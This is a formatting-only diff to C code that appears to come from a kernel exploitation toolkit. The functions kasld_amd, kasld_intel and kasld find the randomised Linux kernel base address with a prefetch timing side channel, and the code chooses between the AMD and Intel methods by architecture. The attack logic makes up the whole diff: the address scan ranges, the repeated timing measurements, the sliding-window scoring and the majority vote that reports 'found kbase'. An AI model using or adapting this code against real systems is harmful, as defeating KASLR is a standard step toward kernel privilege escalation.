@@ -7,15 +7,16 @@
 #define MAX_TRIALS 16
 
 size_t kasld_amd() {
-  return kasld_amd_with_conf(0xffffffff81000000ull,  // start
-                             0xffffffffc0000000ull,  // end
-                             0x0000000000080000ull,  // step
-                             7,                      // num_confirm
-                             11                      // window_size
+  return kasld_amd_with_conf(0xffffffff81000000ull, // start
+                             0xffffffffc0000000ull, // end
+                             0x0000000000080000ull, // step
+                             7,                     // num_confirm
+                             11                     // window_size
   );
 }
 
-size_t kasld_amd_with_conf(size_t start, size_t end, size_t step, size_t num_confirm, size_t window_size) {
+size_t kasld_amd_with_conf(size_t start, size_t end, size_t step,
+                           size_t num_confirm, size_t window_size) {
   ASSERT_MSG(start < end, "Start address must be less than end address");
   ASSERT_MSG((end - start) % step == 0, "Range must be divisible by step size");
 
@@ -35,7 +36,8 @@ size_t kasld_amd_with_conf(size_t start, size_t end, size_t step, size_t num_con
 
       REP(16) {
         REP(i, num_steps) {
-          times[i] = MIN(times[i], measure_prefetch((void*)checking_address[i]));
+          times[i] =
+              MIN(times[i], measure_prefetch((void *)checking_address[i]));
         }
       }
 
@@ -43,9 +45,7 @@ size_t kasld_amd_with_conf(size_t start, size_t end, size_t step, size_t num_con
       uint64_t max_index = 0;
       REP(base_idx, num_steps - window_size) {
         size_t sum = 0;
-        REP(i, window_size) {
-          sum += times[base_idx + i];
-        }
+        REP(i, window_size) { sum += times[base_idx + i]; }
 
         if (sum > max_value) {
           max_value = sum;
@@ -69,10 +69,12 @@ size_t kasld_amd_with_conf(size_t start, size_t end, size_t step, size_t num_con
 }
 
 size_t kasld_intel() {
-  return kasld_intel_with_conf(0xffffffff81000000ull, 0xffffffffd0000000ull, 0x0000000000400000ull, 7);
+  return kasld_intel_with_conf(0xffffffff81000000ull, 0xffffffffd0000000ull,
+                               0x0000000000400000ull, 7);
 }
 
-size_t kasld_intel_with_conf(size_t start, size_t end, size_t step, size_t num_confirm) {
+size_t kasld_intel_with_conf(size_t start, size_t end, size_t step,
+                             size_t num_confirm) {
   ASSERT_MSG(start < end, "Start address must be less than end address");
   ASSERT_MSG((end - start) % step == 0, "Range must be divisible by step size");
 
@@ -92,7 +94,8 @@ size_t kasld_intel_with_conf(size_t start, size_t end, size_t step, size_t num_c
 
       REP(16) {
         REP(i, num_steps) {
-          times[i] = MIN(times[i], measure_prefetch((void*)checking_address[i]));
+          times[i] =
+              MIN(times[i], measure_prefetch((void *)checking_address[i]));
         }
       }
 
@@ -114,7 +117,8 @@ size_t kasld_intel_with_conf(size_t start, size_t end, size_t step, size_t num_c
       log_success("[side channel] found kbase at %#lx", majority.data);
 
       if (0xffffff & majority.data) {
-        log_warn("unaligned kernel base detected. kbase might be %#lx", majority.data & ~0xfffffful);
+        log_warn("unaligned kernel base detected. kbase might be %#lx",
+                 majority.data & ~0xfffffful);
       }
       return majority.data;
     }
@@ -126,13 +130,13 @@ size_t kasld_intel_with_conf(size_t start, size_t end, size_t step, size_t num_c
 
 size_t kasld() {
   switch (get_arch()) {
-    case x86_64_intel:
-      return kasld_intel();
-    case x86_64_amd:
-      return kasld_amd();
-    default:
-      log_error("Unsupported architecture for kasld");
-      return 0;
+  case x86_64_intel:
+    return kasld_intel();
+  case x86_64_amd:
+    return kasld_amd();
+  default:
+    log_error("Unsupported architecture for kasld");
+    return 0;
   }
 }
 
